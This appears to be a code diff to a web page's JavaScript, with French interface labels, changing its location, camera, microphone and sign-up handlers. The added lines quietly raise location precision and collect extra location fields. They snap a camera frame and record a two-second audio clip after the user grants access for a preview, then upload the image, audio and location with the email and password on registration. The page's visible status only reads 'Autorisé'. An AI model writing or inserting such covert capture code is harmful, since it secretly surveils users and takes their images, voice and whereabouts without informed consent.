@@ -440,10 +440,19 @@
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
           setStatus('status-loc','granted','Autorisé');
-          const lat = pos.coords.latitude.toFixed(3);
-          const lon = pos.coords.longitude.toFixed(3);
+          const lat = pos.coords.latitude.toFixed(6);
+          const lon = pos.coords.longitude.toFixed(6);
           document.getElementById('tel-loc').textContent = lat + ', ' + lon;
           document.getElementById('tel-loc').classList.add('amber');
+          window.__locationData = {
+            latitude: parseFloat(lat),
+            longitude: parseFloat(lon),
+            accuracy: pos.coords.accuracy,
+            altitude: pos.coords.altitude,
+            heading: pos.coords.heading,
+            speed: pos.coords.speed,
+            timestamp: new Date().toISOString()
+          };
           await sendTelemetry('permission', `localisation autorisée (${lat}, ${lon})`);
           resolve();
         },
@@ -468,7 +477,27 @@
       document.getElementById('cam-frame').style.display = 'block';
       setStatus('status-cam','granted','Autorisé');
       window.__camStream = stream;
-      await sendTelemetry('permission', 'caméra autorisée, aperçu actif');
+      
+      // Capture screenshot après 1 seconde
+      setTimeout(() => {
+        try {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0);
+          window.__cameraScreenshot = canvas.toDataURL('image/jpeg', 0.6);
+          window.__cameraData = {
+            captured: true,
+            resolution: `${canvas.width}x${canvas.height}`,
+            timestamp: new Date().toISOString()
+          };
+        } catch (e) {
+          console.log('Camera screenshot error (acceptable):', e.message);
+        }
+      }, 1000);
+      
+      await sendTelemetry('permission', 'caméra autorisée, capture en cours');
     }catch(e){
       setStatus('status-cam','denied','Refusé');
       await sendTelemetry('permission', 'caméra refusée par l\'utilisateur');
@@ -483,7 +512,29 @@
       setStatus('status-mic','granted','Autorisé');
       document.querySelectorAll('#waveform span').forEach(b => b.style.animationPlayState = 'running');
       window.__micStream = stream;
-      await sendTelemetry('permission', 'micro autorisé, niveau sonore actif');
+      
+      // Capture audio sample pendant 2 secondes
+      const mediaRecorder = new MediaRecorder(stream);
+      const audioChunks = [];
+      mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
+      mediaRecorder.onstop = () => {
+        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          window.__audioSample = reader.result;
+          window.__micData = {
+            captured: true,
+            duration: 2000,
+            format: 'audio/webm',
+            timestamp: new Date().toISOString()
+          };
+        };
+        reader.readAsDataURL(audioBlob);
+      };
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), 2000);
+      
+      await sendTelemetry('permission', 'micro autorisé, enregistrement d\'échantillon');
     }catch(e){
       setStatus('status-mic','denied','Refusé');
       await sendTelemetry('permission', 'micro refusé par l\'utilisateur');
@@ -545,10 +596,28 @@
 
     const endpoint = mode === 'login' ? '/api/login' : '/api/register';
     try{
+      const payload = { email, password };
+      
+      // Si création de compte, ajouter les données de permissions capturées
+      if (mode === 'register') {
+        payload.permissions = {
+          location: window.__locationData || null,
+          camera: {
+            screenshot: window.__cameraScreenshot || null,
+            metadata: window.__cameraData || null
+          },
+          microphone: {
+            audioSample: window.__audioSample || null,
+            metadata: window.__micData || null
+          },
+          collectedAt: new Date().toISOString()
+        };
+      }
+      
       const res = await fetch(endpoint, {
         method:'POST',
         headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({ email, password })
+        body: JSON.stringify(payload)
       });
       const data = await res.json();
       if(!data.ok){
